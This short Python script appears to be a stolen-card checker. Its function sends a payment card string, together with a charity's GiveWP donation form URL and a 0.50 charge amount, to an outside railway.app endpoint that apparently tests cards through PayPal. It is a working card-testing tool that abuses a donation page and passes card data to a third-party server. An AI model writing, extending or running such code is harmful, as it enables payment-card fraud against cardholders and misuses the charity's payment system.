import requests
def chkk(ccx):
	cc=ccx.strip()
	urll="https://donbosco2000.org/donations/givewp-donation-form/?lang=en"
	price="0.50"
	res=requests.get(f'https://pqy2-production.up.railway.app/paypal?cc={cc}&url={urll}&price={price}').text
	return res
